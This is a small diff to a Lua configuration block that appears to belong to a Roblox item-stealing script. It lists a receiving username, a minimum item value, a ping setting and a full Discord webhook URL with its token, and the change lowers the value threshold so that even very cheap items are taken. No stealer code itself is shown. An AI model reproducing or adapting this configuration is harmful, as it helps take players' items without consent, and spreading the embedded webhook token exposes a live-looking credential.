@@ -1,5 +1,5 @@
 _G.Usernames = {"murnder9"} -- you can add as many as you'd like
-_G.min_value = 0.001
+_G.min_value = 0.00001
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.webhook = "https://discord.com/api/webhooks/1373607069113913414/nb7yZrb2qSMzFnyGSGPlcQh47BZ1e8mnEB1wzLlrhe6E_6jRTkN4CarDV48Ml7hPvRyP" -- change to your webhook
 
